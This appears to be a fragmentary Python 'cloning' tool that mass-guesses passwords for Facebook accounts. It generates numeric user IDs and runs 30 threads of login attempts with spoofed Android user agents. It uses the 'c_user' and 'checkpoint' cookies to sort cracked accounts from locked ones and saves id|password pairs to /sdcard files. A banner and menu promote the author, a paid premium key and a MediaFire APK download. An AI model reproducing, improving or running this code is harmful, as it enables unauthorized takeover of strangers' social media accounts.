...
\033[1;91m╚══════════════════════════════════════╝                                     
\033[1;91m╔══════════════════════════════════════╗
\033[1;92m║\033[1;97m[+] DEVOLPER   : \033[1;92mDILBERK HAN              ║
\033[1;92m║\033[1;97m[+] FACEBOOK   : \033[1;92mDILBER KHAN              ║
\033[1;92m║\033[1;97m[+] WHATSAPP   : \033[1;92m+*********                   ║
\033[1;92m║\033[1;97m[+] GITHUB     : \033[1;92mDILBERALI.                       ║
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-openhttps://www.facebook.com/profile.php?id=100067086768893&mibextid=ZbWKwL);menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://mediafire.com/file/y1wvgc2zqqunxbn/DILBER_VPN1.0.apk/file');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://youtube.com/@mhDILBER8427');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        else:
                        ...
                        linex()
                        tks = ("Hi DILBER Sir, I Need To Buy Your Paid DILBER PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
...
def pak():
                ...
                for nmbr in range(limit):
                        ...
                        user.append(nmp)
                with tred(max_workers=30) as dilber:     
                        clear()
                        tl = str(len(user))
                        print('\033[1;92m════════════════════════════════════════')
                        ...
                        for psx in user:
                                ...
                                DILBER.submit(rndm,ids,passlist)
                print('\033[1;37m')
                linex()
                print(' The process has completed')
                print(' Total OK/CP: '+str(len(oks))+'/'+str(len(cps)))
...
"Mozilla/5.0 (Linux; Android 6.0.1; XT1254 Build/MCG24.251-5-5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/391.1.0.35.104;]"]
        try:
                ...
                for fikr in passlist:
                        ...
                        DILBER=session.cookies.get_dict().keys()
                        if "c_user" in DILBER:
                                ...
                                oks.append(ids)
                                break
                        elif 'checkpoint' in DILBER:
                                if 'y' in pcp:
                                        print('\r\r\033[1;31m [DILBER-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/DILBER-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        break
                                                ...
                                                print('\r\r\033[1;31m [DILBER-2F] : '+cid+' | '+ps+ '\033[1;97m')
